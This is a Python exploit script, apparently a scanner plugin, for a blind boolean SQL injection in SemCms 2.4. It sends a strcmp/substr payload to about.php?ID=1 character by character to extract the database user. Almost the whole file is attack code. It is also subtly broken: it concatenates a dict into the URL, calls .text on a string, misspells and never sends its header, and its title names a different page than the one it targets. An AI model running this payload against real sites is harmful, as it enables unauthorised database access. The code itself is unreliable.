# *_* coding=utf-8 *_*
# Author:Whysec
import requests
class svn_info_verify(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'semcms',
            'title':'SemCms 2.4 View.php一处Sql注入',
            'level':'1',
            'type':'9',
            'author':'Szrzvdny',
            'source':'https://www.inksec.cn/2017/12/26/code_audit_one/',
            'description':'SemCms 2.4 View.php一处Sql注入',
            'payload':{
                'get':{'url':'about.php?ID=1'},
                'post':'1234'
            },
        }
        self.req = requests
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = ["0x61", "0x62", "0x63", "0x64", "0x65",
                   "0x66", "0x67", "0x68", "0x69", "0x6a",
                   "0x6b", "0x6c", "0x6d", "0x6e", "0x6f",
                   "0x70", "0x71", "0x72", "0x73", "0x74",
                   "0x75", "0x76", "0x77", "0x78", "0x79",
                   "0x7a", "0x40", "0x30", "0x31", "0x32",
                   "0x33", "0x34", "0x35", "0x36", "0x37",
                   "0x38", "0x39"
                   ]
        try:
            for b in range(len(payload)):
                for a in payload:
                    sql_payload_user = " || strcmp(substr(user(),%s,1), 0x%s) rlike 0" % (
                    b + 1, a.replace("0x", ""))
                    res = requests.get(self.result['url'] +self.result['payload']['get']+ sql_payload_user).text
                    res1 = requests.get(self.result['url']).text
                    print(res.text)
                    if len(res) != len(res1):
                        return self.result
            # if '81dc9bdb52d04dc20036dbd8313ed055' in len(res.text):
            #     self.result['payload'] = self.result['url'] + self.result['payload']['get']['url']
            #     print(res.text)
            #     return self.result
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = svn_info_verify("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)